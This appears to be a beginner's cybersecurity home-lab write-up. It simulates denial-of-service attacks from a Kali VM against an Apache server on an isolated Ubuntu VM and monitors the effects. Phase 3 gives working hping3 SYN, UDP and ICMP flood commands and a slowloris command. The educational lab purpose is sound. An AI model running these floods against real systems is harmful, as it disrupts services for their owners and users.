DoS Attack Simulation Lab — VirtualBox Home Lab

A beginner cybersecurity home lab documenting a controlled DoS attack simulation using Kali Linux and Ubuntu in an isolated VirtualBox environment.

---

Lab Overview

Platform : Oracle VirtualBox 
Attacker : Kali Linux 
Victim : Ubuntu
Network: (Adapter 1) VirtualBox Internal Network (isolated) + (Adapter 2) NAT (for installation)
Tools Used: hping3, slowloris, tcpdump, netstat
Purpose : Educational — understanding DoS attacks at the network level 

---


Phase 1 — Environment Setup

VirtualBox Adapter Configuration (both VMs)
- **Adapter 1** → Internal Network, name: `inet`
- **Adapter 2** → NAT (for package installs only)

Assign Static IPs

**Ubuntu (victim):**
```bash
sudo ip addr add 10.0.0.1/24 dev enp0s3
sudo ip link set enp0s3 up

# Make permanent via netplan
sudo nano /etc/netplan/00-installer-config.yaml
```
```yaml
network:
  version: 2
  ethernets:
    enp0s3:
      addresses:
        - 10.0.0.1/24
```
```bash
sudo netplan apply
```

**Kali Linux (attacker):**
```bash
sudo ip addr add 10.0.0.2/24 dev eth0
sudo ip link set eth0 up

# Make permanent
sudo nano /etc/network/interfaces
```
```
auto eth0
iface eth0 inet static
  address 10.0.0.2
  netmask 255.255.255.0
```
```bash
sudo systemctl restart networking
```

Verify Connectivity
```bash
# From Kali
ping 10.0.0.1

# From Ubuntu
ping 10.0.0.2
```

---

Phase 2 — Target Service Setup

**On Ubuntu — install Apache as the target web server:**
```bash
sudo apt update
sudo apt install apache2 -y
sudo systemctl start apache2

# Verify
curl http://10.0.0.1
```

**On Kali — install attack tools:**
```bash
sudo apt install hping3 -y
pip3 install slowloris --break-system-packages
```

---

Phase 3 — Attack Simulation

>All attacks were performed only against `10.0.0.1` (local Ubuntu VM). No real network or internet traffic was involved.

1. SYN Flood
Floods the target with TCP SYN packets, exhausting the connection table and preventing legitimate connections.
```bash
sudo hping3 -S --flood -V -p 80 10.0.0.1
```

2. UDP Flood
Overwhelms the target with UDP packets on port 53.
```bash
sudo hping3 --udp -p 53 --flood 10.0.0.1
```

3. ICMP Flood
Floods the network layer with ICMP echo requests.
```bash
sudo hping3 -1 --flood 10.0.0.1
```

4. Slowloris (HTTP Layer)
Holds HTTP connections open slowly, exhausting Apache's connection pool without generating high bandwidth.
```bash
slowloris 10.0.0.1
```

---

Phase 4 — Monitoring the Attack

Run these on Ubuntu while the attack is active:

```bash
# Watch SYN_RECV connections spike in real time
watch -n 1 'netstat -an | grep SYN_RECV | wc -l'

# Live packet capture from attacker
sudo tcpdump -i enp0s3 -n src 10.0.0.2
```

Safety & Ethics

This lab was conducted in a fully isolated environment. Key safety measures:

- VirtualBox Internal Network ensures zero traffic reaches the real network
- All attack commands targeted only `10.0.0.1` — a local VM
- NAT adapter was used only for package installation


Key Learnings

- DoS attacks work by exhausting a resource — connections, bandwidth, or CPU
- SYN floods exploit the TCP 3-way handshake by never completing it
- Slowloris is effective at low bandwidth by keeping connections alive slowly
- Monitoring the victim side gives a clear picture of how the attack impacts the system
- Isolated lab environments like VirtualBox are safe and legal for practicing offensive techniques

---

Tools Reference


`hping3`  Packet crafting and flood attacks 
`slowloris` HTTP layer DoS 
`tcpdump` Packet capture and analysis 
`netstat` Connection state monitoring 


---

*Lab conducted in an isolated VirtualBox environment for educational purposes only.*
